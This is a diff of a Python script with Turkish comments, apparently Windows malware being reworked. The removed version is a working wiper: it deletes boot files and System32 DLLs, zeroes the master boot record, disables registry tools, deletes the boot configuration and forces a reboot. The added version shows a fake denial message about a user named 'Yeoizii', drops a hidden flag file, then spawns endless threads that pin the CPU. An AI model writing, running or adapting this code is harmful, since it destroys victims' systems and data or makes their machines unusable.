@@ -1,90 +1,82 @@
+import ctypes
+import time
+import multiprocessing
+import sys
+import threading
 import os
-import shutil
-import subprocess
 
 # ==========================================
-# KRİTİK SİSTEM DOSYALARINI SİL
+# FLAG DOSYASI (DANDİK İSİM)
 # ==========================================
-def delete_system_files():
+FLAG_FILE = "C:\\Windows\\Temp\\fgjhfgkfsjg.flag"
+
+# ==========================================
+# 1. SAHTE PENCERE (SADECE FLAG YOKSA)
+# ==========================================
+def show_fake_window():
+    if os.path.exists(FLAG_FILE):
+        print("[*] Flag dosyası bulundu, pencere açılmayacak.")
+        return
+    
+    result = ctypes.windll.user32.MessageBoxW(
+        0,
+        "Although the ticket referenced by 'Yeoizii' was reviewed under better and fewer rules, no login from any other location could be found on the account. Since it was made from the person's own computer, the arrows point to this fact. The request has been denied!",
+        "Your objection has been overruled!",
+        0x10 | 0x1
+    )
+    return result
+
+# ==========================================
+# 2. İŞLEMCİYİ ZORLA (4 KATI)
+# ==========================================
+def cpu_killer():
+    while True:
+        x = 3.14159
+        for _ in range(1000000):
+            x = x ** 1.00001
+            x = x / 1.000001
+        arr = [i ** i for i in range(5000)]
+        for _ in range(100):
+            arr.sort()
+            arr.reverse()
+
+def start_cpu_killer():
+    core_count = multiprocessing.cpu_count()
+    thread_count = core_count * 4
+    print(f"[*] Çekirdek: {core_count}, Açılacak thread: {thread_count}")
+    
+    for _ in range(thread_count):
+        threading.Thread(target=cpu_killer, daemon=True).start()
+    
+    print("[+] CPU %100 yüklendi (4 katı)")
+
+# ==========================================
+# 3. FLAG OLUŞTUR
+# ==========================================
+def create_flag():
     try:
-        # Boot dosyaları
-        boot_files = [
-            "C:\\bootmgr",
-            "C:\\Boot\\BCD",
-            "C:\\Windows\\System32\\winload.exe",
-            "C:\\Windows\\System32\\winload.efi",
-            "C:\\Windows\\System32\\winlogon.exe",
-            "C:\\Windows\\System32\\hal.dll"
-        ]
-        for f in boot_files:
-            try:
-                if os.path.exists(f):
-                    os.remove(f)
-                    print(f"[+] Silindi: {f}")
-            except Exception as e:
-                print(f"[-] Silinemedi: {f} - {e}")
+        with open(FLAG_FILE, "w") as f:
+            f.write("EXECUTED")
+        print(f"[+] Flag oluşturuldu: {FLAG_FILE}")
     except Exception as e:
-        print(f"[-] Hata: {e}")
+        print(f"[-] Flag oluşturulamadı: {e}")
 
 # ==========================================
-# MBR (MASTER BOOT RECORD) SİL
-# ==========================================
-def wipe_mbr():
-    try:
-        with open("\\\\.\\PhysicalDrive0", "wb") as f:
-            f.write(b'\x00' * 512)
-        print("[+] MBR silindi!")
-    except Exception as e:
-        print(f"[-] MBR silinemedi: {e}")
-
-# ==========================================
-# REGISTRY KİLİTLE
-# ==========================================
-def lock_registry():
-    try:
-        import winreg
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        winreg.CreateKey(key, subkey)
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-            winreg.SetValueEx(regkey, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
-        print("[+] Registry kilitlendi!")
-    except Exception as e:
-        print(f"[-] Registry hatası: {e}")
-
-# ==========================================
-# SİSTEM32 DLL SİL
-# ==========================================
-def delete_dlls():
-    try:
-        os.system('del /f /s /q C:\\Windows\\System32\\*.dll >nul 2>&1')
-        print("[+] DLL'ler silindi!")
-    except Exception as e:
-        print(f"[-] DLL silinemedi: {e}")
-
-# ==========================================
-# BCD SİL
-# ==========================================
-def delete_bcd():
-    try:
-        subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
-        print("[+] BCD silindi!")
-    except Exception as e:
-        print(f"[-] BCD silinemedi: {e}")
-
-# ==========================================
-# HEP BİRLİKTE ÇALIŞTIR
+# 4. ANA
 # ==========================================
 if __name__ == "__main__":
-    print("[*] Sistem silme işlemi başlatıldı...")
+    # Flag yoksa pencere aç, varsa açma
+    show_fake_window()
     
-    delete_system_files()
-    wipe_mbr()
-    lock_registry()
-    delete_dlls()
-    delete_bcd()
+    # Flag oluştur (bir daha açılmamak için)
+    create_flag()
     
-    print("[+] Sistem silme tamamlandı!")
+    # 10 saniye bekle
+    time.sleep(10)
     
-    # Bilgisayarı yeniden başlat
-    os.system("shutdown /r /t 0")
+    # İşlemciyi zorla (4 katı)
+    start_cpu_killer()
+    
+    # Sonsuz bekle
+    while True:
+        time.sleep(60)
